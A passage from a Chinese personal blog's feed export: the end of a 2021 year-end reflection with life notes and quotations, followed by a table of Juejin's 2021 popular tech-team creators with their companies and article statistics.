title="七、小结（小抄）"></a>七、小结（小抄）</h3><p><code>专注</code>，追求极致和追求完美的表现，导致花费更多的时间。当思考和总结时，必然需要花费大量时间，就像平时开发完功能后，我都会把所有测试的情况，所有预知的情况都模拟演示一遍，这需要花费更多的精力，也需要更多的时间，但必然也会给自己和别人，节省更多的返工时间。</p><p>所以，这里跟往年一样，摘抄的一些笔记，希望对大家有帮助。</p><p>以前年少时觉得，能帮就帮的理念，现在觉得没有提问好的问题，基本不想回答。这也理解了以前自己问大神们的问题，无比惭愧。</p><p><strong>向别人求助</strong></p><p>一个好的提问，包含这几点内容：</p><ol><li>谦虚的态度，</li><li>细致的问题背景，</li><li>目前你的进度和结论，</li><li>你期望得到的帮助等。</li></ol><p>问题复现尽可能详细，包括以下内容：</p><ul><li>操作步骤</li><li>重现条件</li><li>最好有截图/数据报告</li><li>最好能提供非业务相关的可复现代码片段</li></ul><p><strong>约局</strong></p><ol><li>先拟定意向时间，给大家做封闭选择“行还是不行”。不适合问大家什么时候有空等开放性问题</li><li>约饭要选择可以预见的时间，以免安排太长久，变数多。</li><li>约好之后要发日历，以免大家忙着忘记了。增加成功率。</li><li>如果还想更好一些，把吃什么、在哪里这些信息都提供了。</li></ol><p>以后知道怎么约饭了不？</p><p><strong>任正非文集</strong></p><blockquote><p>“公司推行效益优先，兼顾公平原则，让优秀分子先富裕起来，但要反对富裕起来后的不良行为，不要做违法乱纪的事，要加强精神文明教育，要作风正派，在公司按公司的纪律办事，在公司以外按国家法律办事，违反公司纪律和国家法律的，公司决不迁就。”<br>《团结奋斗 再创华为佳绩》</p></blockquote><p>应届毕业生没有基础，公司不看没经验的人，回想自己毕业那时。</p><blockquote><p>“对新来员工，因为没有记录，晋升较慢，为此十分歉意。如果您是一个开放系统，善于吸取别人的经验，善于与人合作，借助别人提供的基础，可能进步就会很快。如果封闭自己，怕工分不好算，就需要较长时间，也许到那时，你的工作成果已没有什么意义了。实践是您水平提高的基础，它充分的检验了您的不足，只有暴露出来，您才会有进步。实践再实践，尤其对青年学生十分重要。唯有实践后善于用理论去归纳总结，才会有飞跃的提高。有一句名言，没有记录的公司，迟早要跨掉的，多么尖锐。一个不善于总结的公司会有什么前途，个人也不是如此吗？”<br>《致新员工书》</p></blockquote><p><strong>初心</strong></p><p><code>think different</code>，我们总想与别人一样，别人会的，也要学，却不曾想着与别人不同的地方，自己的初心。</p><ol><li>不要去罗马，换个赛道，机会有限，你想要什么：钱 vs 生活/幸福？</li><li>承认自己的普通，和自己和解</li></ol><p><strong>学习</strong></p><p>学得更多，才能走的更远。</p><ol><li>思想落后</li><li>自我设限</li><li>资本兜底（保障/后路）</li></ol><p><strong>做事</strong></p><blockquote><p>我想首先就是，摆脱低自尊的心态，不要以自己为先，而是以事为先。<br>摆正心态，再来就是方法。我认为把事做成，关键是修炼这四个维度的能力：</p><p>认知上，要有认清时机、看到机会的能力看到多大机会做多大事。<br>思维上，必须要有看待问题的模型和清晰的逻辑。模型決定了方向感，逻辑決定精确度。<br>方法上，做任何事都要有一套流程和方法，要先知道怎么把事做对，然后才是开始做。<br>实践上，把事做成也是需要积累经验的。无论是踩过的坑，还是吃到的果实，都要亲自体验过。</p><p>如果确信事情能做好，可以得到别人的夸奖，那就去做。如果事情有做不好的风险，别人可能看不起自己，那么就不去做。这就是，把做一件事的目标，从做事变成了做人。</p><p>——— 张潇雨</p></blockquote><p><strong>人类7大罪</strong></p><ul><li>傲慢</li><li>嫉妒</li><li>愤怒</li><li>懒惰</li><li>贪婪</li><li>暴食</li><li>色欲</li></ul><p><strong>法律</strong></p><blockquote><p>法律的一个重要功能，正是在偏见中寻找平衡之道，<br>就是在各种偏见中形成一种平衡之道，<br>各种对立利益中，寻找出一种合乎中道的恰如其分。</p><p>——— 罗翔</p></blockquote><h3 id="八、总结（未来）"><a href="#八、总结（未来）" class="headerlink" title="八、总结（未来）"></a>八、总结（未来）</h3><p>疫情常态化下，消费者行为呈现出四大新趋势：消费两极分化明显，消费者圈层细分显著，全渠道呈常态，私域生态持续繁荣。</p><p>正如上文，给出了很多问题，也给出了很多答案，似乎有答案，但又似乎没有答案。这些不确定性，正是人生的魅力所在。正如人一样，人的一生，各种各样，同归，无法复制，正如世上没有两个一样的人。懂的越多，想的越多，就会觉得自己的境界还达不到，从而内心也许更平静、更多憧憬，做好自己的表率，知足。</p><p>我们往往在追求与别人一样时，忽视了自己的异样。</p><p>三十而立，四十不惑，未来十年，希望带着这些问题，传道受业解惑矣！</p><p><strong>最后</strong></p><p>在疫情常态化的大环境下，万物都在快速变化，对于每个人来说，都会有不同的体会。面对内外的环境，往大的方向看，每个人都付出了很多努力，可能因为不可抗拒的原因，得不到结果的日子。正因如此，每个人更加应该 “扎根”。</p><blockquote><p>“每个优秀的人，都有一段沉默的时光。<br>那段时光，是付出了很多努力，却得不到结果的日子。我们把它叫作“扎根”。”<br>——— 习近平</p></blockquote><h3 id="九、参考引用"><a href="#九、参考引用" class="headerlink" title="九、参考引用"></a>九、参考引用</h3><ul><li><a href="https://ihtcboy.com/2021/01/01/2021-01-01_2020/">辞幕2020，前行2021 | iHTCboy’s blog</a></li></ul><blockquote><p>法律的一个重要功能，正是在偏见中寻找平衡之道， 就是在各种偏见中形成一种平衡之道， 各种对立利益中，寻找出一种合乎中道的恰如其分。<br>——— 罗翔<br><a href="https://m.weibo.cn/status/4660997389028076">普法达人张三 - 侵犯罪中的同意问题</a></p></blockquote><blockquote><p>一个技术高手未必是一个优秀的解决方案专家<br> <a href="https://mp.weixin.qq.com/s/MivhBBlwCqrNM3vxuSnI3w">论框架思维</a></p></blockquote><blockquote><p>一个好的提问大体是需要包含这几点内容：谦虚的态度，细致的问题背景，目前你的进度和结论，你期望得到的帮助等。<br><a href="https://mp.weixin.qq.com/s/HWbPbPBPYgFJsM-oc_4tvw">人物访谈 | 老司机周报主编 Parsifal 专访</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;“子曰：&lt;br&gt;‘吾十有五而志于学，三十而立，四十而不惑，五十而知天命，六十而耳顺，七十而从心所欲，不逾矩。’”&lt;/p&gt;
&lt;p&gt;——— 《论语·为政》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;一、序言&quot;&gt;&lt;a href=&quot;#一、序言&quot; class=&quot;headerlink&quot; title=&quot;一、序言&quot;&gt;&lt;/a&gt;一、序言&lt;/h3&gt;&lt;p&gt;2021年也经历了很多事情，正好 &lt;strong&gt;三十而立&lt;/strong&gt;，一般的理解 &lt;code&gt;立&lt;/code&gt; 是&lt;strong&gt;有所成就&lt;/strong&gt;，但每个人对 “有所成就” 的理解并不一样，有人理解为 &lt;code&gt;事业有成&lt;/code&gt;，而我理解是 &lt;code&gt;立心&lt;/code&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="life" scheme="https://ihtcboy.com/categories/life/"/>
    
    
    <category term="年终总结" scheme="https://ihtcboy.com/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
    <category term="2022" scheme="https://ihtcboy.com/tags/2022/"/>
    
  </entry>
  
  <entry>
    <title>2021掘金年度技术创作者榜单</title>
    <link href="https://ihtcboy.com/2021/12/26/2021-12-26_2021%E6%8E%98%E9%87%91%E5%B9%B4%E5%BA%A6%E4%BA%BA%E6%B0%94%E5%88%9B%E4%BD%9C%E8%80%85%E6%A6%9C%E5%8D%95/"/>
    <id>https://ihtcboy.com/2021/12/26/2021-12-26_2021%E6%8E%98%E9%87%91%E5%B9%B4%E5%BA%A6%E4%BA%BA%E6%B0%94%E5%88%9B%E4%BD%9C%E8%80%85%E6%A6%9C%E5%8D%95/</id>
    <published>2021-12-26T04:00:16.000Z</published>
    <updated>2021-12-26T10:12:38.483Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>想起最近大家的一个讨论：“现在互联网这么多内容，我应该从那里开始学？跟谁学？”，还有很多优秀的技术团队或者开发者博客等很久没有发表新文章了，怎么让技术社区活跃起来等等。</p><p>正值 2021 年结尾，掘金举办《<a href="https://rank.juejin.cn/rank/2021">2021年度人气创作者榜单</a>》活动，让我们程序员狂欢的同时，其实也让优秀的开发者和团队，出现在大众的视野，出现在闪烁光芒的舞台舞台上！</p><p>所以，笔者从掘金的活动页面，梳理了人气创作者榜单，希望大家在投票和狂欢的同时，认识到更多优秀的开发者和团队，关注他们的文章和创新！向优秀学习，是让我们变成自己变得优秀的基础。</p><span id="more"></span><h3 id="二、技术团队"><a href="#二、技术团队" class="headerlink" title="二、技术团队"></a>二、技术团队</h3><p>这里收集了 92 个掘的技术团队，排名不分先后。（注：<code>数据收集时间截止：2021 年 12 月 26 日中午 12 点前。</code>）</p><p>这里列出了每个团队的大部分的简介，需要说的是，因为每个团队的创建时间不一样，所以文章的阅读数、点赞数、账号等级都不一定很高，大家可以根据自己的兴趣找到关注点啊~</p><table><thead><tr><th align="left">团队名</th><th align="left">简介</th><th align="left">标签</th><th align="left">公司</th><th align="left">文章数</th><th align="left">文章被点赞数</th><th align="left">文章被阅读数</th><th align="left">关注数</th><th align="left">等级</th></tr></thead><tbody><tr><td align="left"><a href="https://juejin.cn/user/1002387318511214">37手游iOS技术运营团队</a></td><td align="left">分享技术动态、实践和思考！热爱，开放，严谨，担当~</td><td align="left">iOS技术运营团队</td><td align="left">三七互娱</td><td align="left">11</td><td align="left">429</td><td align="left">42161</td><td align="left">286</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3456520257288974">政采云前端团队</a></td><td align="left">政采云前端 ZooTeam 团队，不掺水的原创。 团队站点：<a href="https://zoo.team/">https://zoo.team</a></td><td align="left">-</td><td align="left">公众号 @ 政采云前端团队</td><td align="left">229</td><td align="left">33875</td><td align="left">1405511</td><td align="left">22382</td><td align="left">6</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3306939878744669">百应前端团队</a></td><td align="left">-</td><td align="left">-</td><td align="left">浙江百应科技有限公司</td><td align="left">15</td><td align="left">499</td><td align="left">13973</td><td align="left">201</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/641770521630270">QiShare</a></td><td align="left">QiShare是一个移动端技术文章分享平台，由奇舞团（360集团大前端团队）的移动端团队运营。</td><td align="left">移动端团队</td><td align="left">奇舞团（360集团大前端团队）</td><td align="left">286</td><td align="left">4654</td><td align="left">653897</td><td align="left">19672</td><td align="left">5</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3104676565234429">IDuxFE</a></td><td align="left"><a href="https://github.com/IDuxFE">https://github.com/IDuxFE</a></td><td align="left">前端</td><td align="left">深信服前端团队</td><td align="left">30</td><td align="left">889</td><td align="left">64033</td><td align="left">293</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/712139267650141">DevUI团队</a></td><td align="left">DevUI：面向企业中后台的前端开源解决方案。官网：devui.design</td><td align="left">前端组件库</td><td align="left">华为</td><td align="left">95</td><td align="left">3981</td><td align="left">302038</td><td align="left">2052</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3966693685605143">华为云开发者社区</a></td><td align="left">华为云开发者社区，提供全面深入的云计算前景分析、丰富的技术干货</td><td align="left">-</td><td align="left">-</td><td align="left">1758</td><td align="left">4483</td><td align="left">894896</td><td align="left">2705</td><td align="left">5</td></tr><tr><td align="left"><a href="https://juejin.cn/user/818501527305213">知虾技术团队</a></td><td align="left">-</td><td align="left">开发工程师</td><td align="left">萌啦科技</td><td align="left">2</td><td align="left">53</td><td align="left">594</td><td align="left">75</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4169764695465239">ELab</a></td><td align="left">字节跳动大力教育前端团队，负责教育全线产品前端开发工作。</td><td align="left">前端工程师</td><td align="left">公众号：ELab团队</td><td align="left">87</td><td align="left">2740</td><td align="left">141209</td><td align="left">586</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2392959969672375">NEXTOP前端团队</a></td><td align="left">“NEXTOP前端团队”</td><td align="left">-</td><td align="left">明顶科技</td><td align="left">12</td><td align="left">1074</td><td align="left">35760</td><td align="left">346</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4186596000416094">百度Geek说</a></td><td align="left">公众号：百度Geek说</td><td align="left">架构师</td><td align="left">百度</td><td align="left">88</td><td align="left">1798</td><td align="left">57922</td><td align="left">160</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4046681599903463">比心FE</a></td><td align="left">我们相信在轻松、和谐氛围下，才能激发更多的创造力和积极性  期待你加入我们团队 一起造火箭！！</td><td align="left">研发</td><td align="left">比心APP</td><td align="left">17</td><td align="left">231</td><td align="left">10439</td><td align="left">76</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1935567327597559">专有钉钉前端团队</a></td><td align="left">😎 和我们一起探索大型组织数字化技术最佳实践 ~</td><td align="left">前端</td><td align="left">阿里巴巴集团 - 钉钉事业部</td><td align="left">7</td><td align="left">1406</td><td align="left">52932</td><td align="left">873</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2805609404828375">MobTech开发者</a></td><td align="left">-</td><td align="left">产品运营</td><td align="left">-</td><td align="left">42</td><td align="left">77</td><td align="left">24010</td><td align="left">38</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2664871914644525">雪球工程师团队</a></td><td align="left">陪赌、陪聊、陪改Bug。</td><td align="left">前端</td><td align="left">雪球财经</td><td align="left">20</td><td align="left">482</td><td align="left">30224</td><td align="left">77</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4072246798980567">阅文前端团队</a></td><td align="left">微信公众号 ID: yuewen_YFE，官网：<a href="https://blog.yux.team/">https://blog.yux.team</a></td><td align="left">前端工程师</td><td align="left">上海阅文信息技术有限公司</td><td align="left">49</td><td align="left">7784</td><td align="left">229147</td><td align="left">5866</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/114004940043800">mPaaS</a></td><td align="left">mPaaS 源于蚂蚁集团，致力于提供高效、灵活、稳定的移动研发、管理平台。</td><td align="left">mPaaS 官方专栏号</td><td align="left">蚂蚁集团</td><td align="left">139</td><td align="left">1798</td><td align="left">240880</td><td align="left">6371</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/852876753923911">ES2049</a></td><td align="left">爱好写代码</td><td align="left">-</td><td align="left">阿里巴巴 - CRO 技术部 - 体验技术</td><td align="left">62</td><td align="left">3849</td><td align="left">199731</td><td align="left">5243</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4089838988440024">微医前端团队</a></td><td align="left">微医集团大前端专栏，分享原创技术干货。</td><td align="left">公众号「 微医大前端技术 」</td><td align="left">-</td><td align="left">78</td><td align="left">4958</td><td align="left">270949</td><td align="left">1113</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3227821868332765">葡萄城技术团队</a></td><td align="left">葡萄城成立于 1980 年，是全球领先的软件开发技术和低代码平台提供商，以“ 赋能开发者”为使命，致力于通过各类软件开发工具和服务，创新开发模式，提升开发效率，推动软件产业发展，为“数字中国”建设提速。</td><td align="left">公众号</td><td align="left">葡萄城社区</td><td align="left">358</td><td align="left">230</td><td align="left">55942</td><td align="left">536</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1742052939018503">LigaAI</a></td><td align="left">做更懂开发者的智能研发管理平台</td><td align="left">-</td><td align="left">LigaAI</td><td align="left">25</td><td align="left">19</td><td align="left">4869</td><td align="left">8</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/61228381124264">ZEGO即构</a></td><td align="left">音视频云服务通信商</td><td align="left">音视频云服务通信商</td><td align="left">ZEGO 即构科技</td><td align="left">48</td><td align="left">132</td><td align="left">18331</td><td align="left">392</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2137106333053912">袋鼠云数栈前端团队</a></td><td align="left">致力于创造、提供更好的 Web 交互体验</td><td align="left">前端开发工程师</td><td align="left">袋鼠云(杭州玳数科技有限公司)</td><td align="left">27</td><td align="left">598</td><td align="left">40352</td><td align="left">1728</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4265760847567016">网易云音乐大前端团队</a></td><td align="left">-</td><td align="left">-</td><td align="left">网易云音乐</td><td align="left">81</td><td align="left">13430</td><td align="left">633275</td><td align="left">14035</td><td align="left">5</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4275372600866717">快手电商无线团队</a></td><td align="left">-</td><td align="left">-</td><td align="left">快手</td><td align="left">12</td><td align="left">396</td><td align="left">33001</td><td align="left">428</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2277843821933751">腾讯TNTWeb前端团队</a></td><td align="left">TNTWeb腾讯新闻前端团队</td><td align="left">前端</td><td align="left">腾讯</td><td align="left">20</td><td align="left">1034</td><td align="left">39762</td><td align="left">2140</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1626932942211464">设计稿智能生成代码</a></td><td align="left">imgcook.com 专注以 Sketch、PSD、静态图片等形式的视觉稿作为输入，通过智能化</td><td align="left">阿里巴巴 前端委员会智能化小组</td><td align="left">阿里巴巴</td><td align="left">179</td><td align="left">2418</td><td align="left">276473</td><td align="left">4222</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/949604400000199">Hikvision前端</a></td><td align="left">海康威视前端的技术分享，简历投递请联系 <a href="mailto:&#x78;&#x69;&#97;&#x6e;&#103;&#x78;&#105;&#x61;&#x6f;&#51;&#x40;&#104;&#105;&#x6b;&#x76;&#105;&#115;&#x69;&#x6f;&#110;&#x2e;&#99;&#x6f;&#109;">&#x78;&#x69;&#97;&#x6e;&#103;&#x78;&#105;&#x61;&#x6f;&#51;&#x40;&#104;&#105;&#x6b;&#x76;&#105;&#115;&#x69;&#x6f;&#110;&#x2e;&#99;&#x6f;&#109;</a></td><td align="left">-</td><td align="left">杭州海康威视数字技术股份有限公司</td><td align="left">36</td><td align="left">247</td><td align="left">26078</td><td align="left">299</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/395479917804733">StreamNative</a></td><td align="left">打造基于Apache Pulsar的下一代流平台</td><td align="left">-</td><td align="left">StreamNative</td><td align="left">170</td><td align="left">54</td><td align="left">55420</td><td align="left">78</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/712139266336574">融云</a></td><td align="left">安全、可靠的全球互联网通信云服务商</td><td align="left">公众号：融云全球互联网通信云</td><td align="left">-</td><td align="left">209</td><td align="left">46</td><td align="left">22308</td><td align="left">29</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1222312659545351">知晓云</a></td><td align="left">知晓云是国内首家专注于小程序开发的后端云服务，为开发者提供最低门槛的 Serverless 无服务架构接入体验。</td><td align="left">-</td><td align="left">爱范儿</td><td align="left">83</td><td align="left">133</td><td align="left">29247</td><td align="left">112</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4388906147515367">奇舞精选</a></td><td align="left">《奇舞精选》是由奇舞团维护的前端技术社区。除周五外，每天向大家推荐一篇前端相关技术文章，每周五向大家推送汇总的奇舞周刊。</td><td align="left">前端</td><td align="left">奇虎360</td><td align="left">38</td><td align="left">6546</td><td align="left">266947</td><td align="left">7256</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4336129591484647">腾讯AlloyTeam</a></td><td align="left">腾讯 AlloyTeam 团队</td><td align="left">开发工程师</td><td align="left">腾讯</td><td align="left">19</td><td align="left">1099</td><td align="left">68871</td><td align="left">1173</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1275089221067928">AirtestProject</a></td><td align="left">网易游戏AirtestProject团队，开源了airtest和poco2个热门的自动化测试框架，拥有完整的自动化测试解决方案，欢迎咨询</td><td align="left">-</td><td align="left">@网易，公众号：AirtestProject</td><td align="left">106</td><td align="left">137</td><td align="left">147048</td><td align="left">406</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1530175206729016">字节架构前端</a></td><td align="left">字节基础架构前端团队</td><td align="left">FE</td><td align="left">字节跳动</td><td align="left">22</td><td align="left">2059</td><td align="left">87734</td><td align="left">674</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1882007127197694">有道技术团队</a></td><td align="left">有道技术团队，分享有道人的技术思考。<br>小助手微信：ydtech01，欢迎加入有道技术交流群~<br>技术团队邮箱：<a href="mailto:&#121;&#100;&#x74;&#101;&#99;&#104;&#64;&#114;&#100;&#x2e;&#x6e;&#x65;&#116;&#x65;&#97;&#115;&#101;&#x2e;&#99;&#111;&#x6d;">&#121;&#100;&#x74;&#101;&#99;&#104;&#64;&#114;&#100;&#x2e;&#x6e;&#x65;&#116;&#x65;&#97;&#115;&#101;&#x2e;&#99;&#111;&#x6d;</a></td><td align="left">技术布道师</td><td align="left">网易有道</td><td align="left">41</td><td align="left">352</td><td align="left">32415</td><td align="left">341</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3808363977648493">阿里巴巴云原生</a></td><td align="left">-</td><td align="left">-</td><td align="left">阿里巴巴集团</td><td align="left">860</td><td align="left">3508</td><td align="left">864461</td><td align="left">7087</td><td align="left">5</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2665636828032446">JuiceFS</a></td><td align="left">JuiceFS is a distributed POSIX file system built on top of Redis and S3.</td><td align="left">-</td><td align="left">Juicedata</td><td align="left">18</td><td align="left">19</td><td align="left">1904</td><td align="left">7</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/606586148237431">大转转FE</a></td><td align="left">公众号 - 大转转FE ， 欢迎关注</td><td align="left">大前端</td><td align="left">转转</td><td align="left">189</td><td align="left">7163</td><td align="left">379926</td><td align="left">9034</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3456520290310397">OPPO数智技术</a></td><td align="left">OPPO在大数据、云计算、人工智能等领域的技术干货及活动分享，招聘、内容合作、投稿，请留言~</td><td align="left">-</td><td align="left">OPPO</td><td align="left">93</td><td align="left">459</td><td align="left">98434</td><td align="left">3006</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2392954206960247">得物技术</a></td><td align="left">公众号@得物技术</td><td align="left">-</td><td align="left">-</td><td align="left">47</td><td align="left">765</td><td align="left">61174</td><td align="left">773</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/993614243303053">vivo互联网技术</a></td><td align="left">分享 vivo 互联网技术干货与沙龙活动，推荐最新行业动态与热门会议。欢迎</td><td align="left">vivo互联网技术</td><td align="left">vivo互联网</td><td align="left">215</td><td align="left">3309</td><td align="left">322560</td><td align="left">3882</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2815217981724269">推啊前端团队</a></td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">40</td><td align="left">614</td><td align="left">33589</td><td align="left">126</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2656837431466839">运维开发故事</a></td><td align="left">公众号运维开发故事团队</td><td align="left">公众号运维开发故事</td><td align="left">-</td><td align="left">133</td><td align="left">93</td><td align="left">26324</td><td align="left">18</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/220363785507309">OneFlow一流科技</a></td><td align="left">一流科技OneFlow团队的技术分享账号，专注于深度学习，擅长分布式相关。<br>★ OneFlow深度学习框架：github.com/Oneflow-Inc/oneflow <br>★ OF云平台：oneflow.cloud</td><td align="left">团队</td><td align="left">一流科技</td><td align="left">19</td><td align="left">10</td><td align="left">5300</td><td align="left">7</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/475443452453853">SphereEx</a></td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">62</td><td align="left">24</td><td align="left">4073</td><td align="left">5</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1838039172387262">字节跳动技术团队</a></td><td align="left">字节跳动的技术实践分享</td><td align="left">-</td><td align="left">字节跳动</td><td align="left">115</td><td align="left">5561</td><td align="left">814863</td><td align="left">17499</td><td align="left">5</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1363050146844504">PingCAP</a></td><td align="left">PingCAP 是一家开源的新型分布式数据库公司，秉承开源是基础软件的未来这</td><td align="left">-</td><td align="left"><a href="http://pingcap.com/">http://pingcap.com</a></td><td align="left">533</td><td align="left">1192</td><td align="left">230586</td><td align="left">7329</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3104676535869518">腾讯IVWEB团队</a></td><td align="left">腾讯IVWEB团队，负责腾讯互动视频NOW直播、花样直播等产品。持续招聘前端</td><td align="left">-</td><td align="left">腾讯科技(深圳)有限公司</td><td align="left">92</td><td align="left">18208</td><td align="left">746567</td><td align="left">20722</td><td align="left">6</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2400989126606653">Flutter社区</a></td><td align="left">Flutter: 为所有屏幕构建精美应用。Flutter 是 Google 开源的应用开发框架，通过一套代码库，高效构建出精美、原生平台编译的多平台应用。Flutter 官网: flutter.dev 中文开发者网站: flutter.cn</td><td align="left">开发者社区</td><td align="left">-</td><td align="left">32</td><td align="left">176</td><td align="left">19691</td><td align="left">327</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1732486054034584">CreditFE信用前端</a></td><td align="left">蚂蚁信用前端团队，通过创新和科技的力量，把信用事业普惠到生活、商业、企业中的每个角落，专注于小程序、数据可视化、低代码搭建、NodeJS、智能化、营销互动等技术领域。欢迎大家分享沟通技术，关注前端最新动态！</td><td align="left">developer</td><td align="left">alipay</td><td align="left">29</td><td align="left">697</td><td align="left">43321</td><td align="left">165</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1433418893104455">Conflux中文社区</a></td><td align="left">-</td><td align="left">-</td><td align="left">北京清红微谷技术开发有限责任公司</td><td align="left">133</td><td align="left">232</td><td align="left">153196</td><td align="left">350</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1363050147878503">蚂蚁集团分布式架构</a></td><td align="left">Github 地址：<a href="https://github.com/sofastack%EF%BC%8C%E8%87%B4%E5%8A%9B%E4%BA%8E%E6%89%93%E9%80%A0%E4%B8%80%E6%B5%81%E7%9A%84%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF%E5%9C%A8%E9%87%91%E8%9E%8D%E5%9C%BA">https://github.com/sofastack，致力于打造一流的分布式技术在金融场</a></td><td align="left">-</td><td align="left">蚂蚁集团</td><td align="left">215</td><td align="left">1672</td><td align="left">270388</td><td align="left">8501</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3966693685339367">NebulaGraph</a></td><td align="left">NebulaGraph：一个开源的分布式图数据库</td><td align="left">图数据库</td><td align="left">欧若数网</td><td align="left">91</td><td align="left">125</td><td align="left">38034</td><td align="left">126</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3210229682022440">声网Agora</a></td><td align="left">声网Agora（NASDAQ:API）是全球实时互动云服务的开创者，是全球最大的专业服</td><td align="left">-</td><td align="left">Agora.io</td><td align="left">213</td><td align="left">3503</td><td align="left">488509</td><td align="left">16043</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3113453493955527">京东前端</a></td><td align="left">-</td><td align="left">全栈工程师</td><td align="left">京东</td><td align="left">1</td><td align="left">159</td><td align="left">8721</td><td align="left">182</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/26044012181448">37手游安卓团队</a></td><td align="left">37手游安卓团队，负责37手游国内发行SDK/海外发行SDK/游戏相关App等产品。技术问题/交流/进群等可以加官方微信AndroidAssistant37</td><td align="left">Android</td><td align="left">37手游</td><td align="left">31</td><td align="left">440</td><td align="left">57057</td><td align="left">272</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/87611052920983">MegEngine</a></td><td align="left">适合工业级研发的开源深度学习框架-旷视天元MegEngine</td><td align="left">-</td><td align="left">-</td><td align="left">44</td><td align="left">58</td><td align="left">12949</td><td align="left">19</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4495228528238279">58技术</a></td><td align="left">58官方技术号，58技术创新、分享与交流平台</td><td align="left">-</td><td align="left">58同城</td><td align="left">2</td><td align="left">3</td><td align="left">729</td><td align="left">21</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3737995266237751">小米有品技术团队</a></td><td align="left">-</td><td align="left">小米有品的技术实践分享</td><td align="left">小米集团</td><td align="left">3</td><td align="left">124</td><td align="left">9783</td><td align="left">129</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2392970477967453">字节大力智能</a></td><td align="left">官微：DaliIntelligenceTech</td><td align="left">研发</td><td align="left">字节跳动</td><td align="left">29</td><td align="left">1345</td><td align="left">82435</td><td align="left">478</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4450420286057022">bigo前端</a></td><td align="left">coding</td><td align="left">前端开发工程师</td><td align="left">bigo</td><td align="left">52</td><td align="left">655</td><td align="left">45432</td><td align="left">86</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3026268632912584">字节跳动视频云技术团队</a></td><td align="left">作为字节跳动的视频中台部门，视频架构支持了字节全系产品的点播、直播、实时通信、图片、多媒体业务发展，目标成为业界多媒体解决方案领导者，构建极致的视频技术/产品服务体验！</td><td 